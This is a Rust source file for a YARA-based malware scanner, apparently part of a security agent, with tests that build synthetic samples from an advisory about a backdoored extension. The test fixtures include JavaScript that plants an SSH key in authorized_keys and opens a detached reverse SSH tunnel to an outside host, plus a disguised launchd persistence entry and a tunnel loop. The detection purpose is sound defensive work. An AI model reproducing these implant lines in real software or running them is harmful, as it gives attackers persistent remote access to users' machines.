use std::io::Read;
use std::path::{Path, PathBuf};

use riggs_types::RiggsError;
use serde::{Deserialize, Serialize};
use tracing::{info, warn};

/// Only the file prefix is scanned so a huge file can't exhaust agent memory
/// (same bound as static-ai's default).
const MAX_SCAN_BYTES: u64 = 64 * 1024 * 1024;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct YaraMatch {
    pub rule_name: String,
    pub tags: Vec<String>,
    pub matched_strings: Vec<String>,
}

pub struct YaraEngine {
    rules_dir: PathBuf,
    compiled_rules: Option<yara_x::Rules>,
}

impl YaraEngine {
    pub fn new(rules_dir: PathBuf) -> Result<Self, RiggsError> {
        if !rules_dir.is_dir() {
            return Err(RiggsError::Config(format!(
                "YARA rules directory does not exist: {}",
                rules_dir.display()
            )));
        }
        let mut engine = Self {
            rules_dir,
            compiled_rules: None,
        };
        engine.load_rules()?;
        Ok(engine)
    }

    pub fn load_rules(&mut self) -> Result<(), RiggsError> {
        let mut compiler = yara_x::Compiler::new();
        let mut count = 0;

        for path in crate::rule_files(&self.rules_dir, crate::YARA_EXTENSIONS) {
            let source = std::fs::read_to_string(&path)
                .map_err(|e| RiggsError::Io(format!("failed to read {}: {e}", path.display())))?;

            match compiler.add_source(source.as_str()) {
                Ok(_) => count += 1,
                Err(e) => {
                    warn!(
                        path = %path.display(),
                        error = %e,
                        "failed to compile YARA rule, skipping"
                    );
                }
            }
        }

        let rules = compiler.build();
        self.compiled_rules = Some(rules);
        info!(count, dir = %self.rules_dir.display(), "YARA rules compiled");
        Ok(())
    }

    pub fn scan_file(&self, path: &Path) -> Result<Vec<YaraMatch>, RiggsError> {
        let rules = self
            .compiled_rules
            .as_ref()
            .ok_or_else(|| RiggsError::Engine("YARA rules not compiled yet".to_string()))?;

        let mut data = Vec::new();
        std::fs::File::open(path)
            .and_then(|f| f.take(MAX_SCAN_BYTES).read_to_end(&mut data))
            .map_err(|e| RiggsError::Io(format!("failed to read {}: {e}", path.display())))?;

        let mut scanner = yara_x::Scanner::new(rules);
        let results = scanner
            .scan(&data)
            .map_err(|e| RiggsError::Engine(format!("YARA scan error: {e}")))?;

        let matches: Vec<YaraMatch> = results
            .matching_rules()
            .map(|rule| {
                let patterns: Vec<String> = rule
                    .patterns()
                    .flat_map(|p| {
                        let ident = p.identifier().to_string();
                        p.matches()
                            .map(move |m| format!("0x{:x}:{}", m.range().start, ident))
                    })
                    .collect();

                YaraMatch {
                    rule_name: rule.identifier().to_string(),
                    tags: rule.tags().map(|t| t.identifier().to_string()).collect(),
                    matched_strings: patterns,
                }
            })
            .collect();

        Ok(matches)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn scan_file_matches_rule() {
        let dir = std::env::temp_dir().join(format!("riggs-yara-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("t.yar"),
            r#"rule evil { strings: $a = "EVIL_MARKER" condition: $a }"#,
        )
        .unwrap();
        let sample = dir.join("sample.bin");
        std::fs::write(&sample, b"xxEVIL_MARKERxx").unwrap();

        let matches = YaraEngine::new(dir.clone())
            .unwrap()
            .scan_file(&sample)
            .unwrap();
        std::fs::remove_dir_all(&dir).unwrap();

        assert_eq!(matches.len(), 1);
        assert_eq!(matches[0].rule_name, "evil");
    }

    fn shipped_rules_dir() -> PathBuf {
        Path::new(env!("CARGO_MANIFEST_DIR")).join("../../rules")
    }

    // load_rules skips a file that fails to compile, so check each one strictly.
    #[test]
    fn shipped_rules_compile() {
        let files = crate::rule_files(&shipped_rules_dir(), crate::YARA_EXTENSIONS);
        assert!(!files.is_empty());
        for path in files {
            let source = std::fs::read_to_string(&path).unwrap();
            if let Err(e) = yara_x::compile(source.as_str()) {
                panic!("{}: {e}", path.display());
            }
        }
    }

    // Synthetic samples built from the indicators in the 2026-10 Claude Code
    // VSX advisory, not the real implant. The generic implant sample uses a
    // documentation IP so only the behavior-based rule can match it. Every
    // indicator is broken with '|' (stripped at runtime) so this source file
    // and the test binary don't match the shipped rules themselves.
    #[test]
    fn shipped_rules_catch_ssh_backdoor_implant() {
        let cases: &[(&str, &str, &[&str])] = &[
            (
                "implant.js",
                r#"const fs=require("fs"),cp=require("child_process");
fs.appendFileSync(h+"/.ssh/authorized|_keys","ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK0qmZ7DGQ2tGmT4nsLwYFqVJwXUVHBn3zH9pXc8Q7rA ops\n");
cp.spawn("ssh",["-N","-R","*:0:localhost:22","-o","StrictHostKeyChecking=no","-o","ExitOnForwardFailure=yes","tunnel@203.0.113.7"],{detached:true});"#,
                &["SSH_Backdoor_Reverse_Tunnel_Implant"],
            ),
            // ECDSA key types carry no "ssh-" prefix (key from ssh-keygen -t ecdsa).
            (
                "implant-ecdsa.js",
                r#"fs.appendFileSync(h+"/.ssh/authorized|_keys","ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHLEUYQgDGbzIfr/VmTts53pbiHRHg175lkmJSdob2sYrws/Y3nI9W8Aov9fdXN5NWFnus+AX4TWBksq+wRSeUo= ops\n");
cp.spawn("ssh",["-N","-R","*:0:localhost:22","-o","StrictHostKeyChecking=no","tunnel@203.0.113.7"]);"#,
                &["SSH_Backdoor_Reverse_Tunnel_Implant"],
            ),
            (
                "agent.plist",
                "<key>Label</key><string>com.apple.sys|mond</string>\n<string>/bin/sh</string><string>/Users/dev/.config/.s|mt</string>",
                &["ClaudeCode_VSX_Backdoor_2026_10"],
            ),
            (
                "tunnel-loop.sh",
                "while :; do ssh -i /Users/dev/.config/.s|mtk -N tunnel@134.209.|82.225; sleep 60; done",
                &["ClaudeCode_VSX_Backdoor_2026_10"],
            ),
            // Remote-SSH style: reads the authorized keys file, plants no key, opens no tunnel.
            (
                "remote-ssh.js",
                "const p=path.join(home,'.ssh','authorized|_keys');fs.readFileSync(p)",
                &[],
            ),
            // A developer's own reverse tunnel: no key planted.
            (
                "tunnel.sh",
                "ssh -N -R 8022:localhost:22 -o StrictHostKeyChecking=accept-new jump",
                &[],
            ),
            (
                "sysmond.plist",
                "<string>com.apple.sys|mond</string><string>/usr/libexec/sysmond</string>",
                &[],
            ),
            // Only known-hosts override and an IPv6 loopback forward.
            (
                "implant-v6.js",
                r#"fs.appendFileSync(h+"/.ssh/authorized|_keys","ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK0qmZ7DGQ2tGmT4nsLwYFqVJwXUVHBn3zH9pXc8Q7rA ops\n");
cp.spawn("ssh",["-N","-R","*:0:[::1]:22","-o","UserKnownHostsFile=/dev/null","tunnel@203.0.113.7"]);"#,
                &["SSH_Backdoor_Reverse_Tunnel_Implant"],
            ),
            // An analyst's shell history holding just the tunnel host: never quarantined.
            (
                ".bash_history",
                "rg 134.209.|82.225 /var/log\nwhois 134.209.|82.225\n",
                &[],
            ),
        ];

        let engine = YaraEngine::new(shipped_rules_dir()).unwrap();
        let dir = std::env::temp_dir().join(format!("riggs-shipped-yara-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        for (name, data, expected) in cases {
            let sample = dir.join(name);
            std::fs::write(&sample, data.replace('|', "")).unwrap();
            let matched: Vec<String> = engine
                .scan_file(&sample)
                .unwrap()
                .into_iter()
                .map(|m| m.rule_name)
                .collect();
            assert_eq!(matched, *expected, "{name}");
        }
        std::fs::remove_dir_all(&dir).unwrap();
    }
}
